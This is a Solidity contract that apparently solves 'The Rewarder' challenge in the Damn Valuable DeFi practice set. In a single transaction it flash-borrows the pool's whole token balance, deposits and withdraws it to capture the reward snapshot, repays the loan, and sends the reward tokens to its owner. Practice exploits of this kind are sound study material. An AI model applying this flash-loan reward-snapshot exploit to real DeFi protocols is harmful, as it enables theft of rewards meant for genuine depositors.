//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract rewarder{

    DamnValuableToken li;
    FlashLoanerPool pool;
    RewardToken token;
    TheRewarderPool rpool;
    address owner;

    constructor(address a, address b, address c, address d){
        owner = msg.sender;
        li = DamnValuableToken(a);
        pool = FlashLoanerPool(b);
        token = RewardToken(c);
        rpool = TheRewarderPool(d);
    }

    function attack() public{
        uint db = li.balanceOf(address(pool));
        pool.flashLoan(db);
    }

    function receiveFlashLoan(uint ba) public{
        li.approve(address(rpool), ba);

        rpool.deposit(ba);
        rpool.withdraw(ba);

        li.transfer(address(pool),ba);

        uint bal = token.balanceOf(address(this));
        token.transfer(owner, bal);
    }

}